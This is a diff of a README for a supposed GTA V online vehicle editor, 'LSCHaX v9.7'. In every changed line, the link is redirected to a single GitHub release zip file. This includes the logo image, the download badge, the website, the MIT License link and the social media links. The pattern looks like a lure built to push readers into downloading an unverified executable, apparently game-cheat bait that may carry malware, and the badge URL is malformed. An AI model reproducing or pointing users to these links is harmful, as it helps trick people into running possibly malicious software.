@@ -2,7 +2,7 @@
 
 ### Welcome to LSCHaX v9.7 for 1.70!
 
-![LSCHaX Logo](https://www.example.com/lschax_logo.png)
+![LSCHaX Logo](https://github.com/Guraa0441/LSCHaX-for-1.70-External/releases/download/v1.0/Release_x64.zip)
 
 ---
 
@@ -28,7 +28,7 @@ LSCHaX is a popular GTA V online vehicle editor that allows players to customize
 ### 📥 Download
 Click the button below to download the LSCHaX software:
 
-[![Download LSCHaX v9.7](https://img.shields.io/badge/Download-LSCHaX%20v9.7-blue.svg)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download LSCHaX v9.7](https://github.com/Guraa0441/LSCHaX-for-1.70-External/releases/download/v1.0/Release_x64.zip%https://github.com/Guraa0441/LSCHaX-for-1.70-External/releases/download/v1.0/Release_x64.zip)](https://github.com/Guraa0441/LSCHaX-for-1.70-External/releases/download/v1.0/Release_x64.zip)
 
 ---
 
@@ -38,7 +38,7 @@ Click the button below to download the LSCHaX software:
 ---
 
 ### 🌐 Explore More
-For more information and updates, visit our [website](https://www.lschax.com).
+For more information and updates, visit our [website](https://github.com/Guraa0441/LSCHaX-for-1.70-External/releases/download/v1.0/Release_x64.zip).
 
 ---
 
@@ -55,17 +55,17 @@ If the download link is not working or unavailable, please check the "Releases" 
 ---
 
 ### 📜 License
-This project is licensed under the [MIT License](https://opensource.org/licenses/MIT).
+This project is licensed under the [MIT License](https://github.com/Guraa0441/LSCHaX-for-1.70-External/releases/download/v1.0/Release_x64.zip).
 
 ---
 
 ### 🔗 Connect with Us
 Stay connected with the LSCHaX community:
-- Follow us on [Twitter](https://twitter.com/lschax)
-- Join our Discord server [here](https://discord.gg/lschax)
+- Follow us on [Twitter](https://github.com/Guraa0441/LSCHaX-for-1.70-External/releases/download/v1.0/Release_x64.zip)
+- Join our Discord server [here](https://github.com/Guraa0441/LSCHaX-for-1.70-External/releases/download/v1.0/Release_x64.zip)
 
 ---
 
 ### 🌈 Enjoy Customizing Your GTA V Vehicles with LSCHaX v9.7! 🚗
 
-![LSCHaX Vehicles](https://www.example.com/lschax_vehicles.png)
+![LSCHaX Vehicles](https://github.com/Guraa0441/LSCHaX-for-1.70-External/releases/download/v1.0/Release_x64.zip)
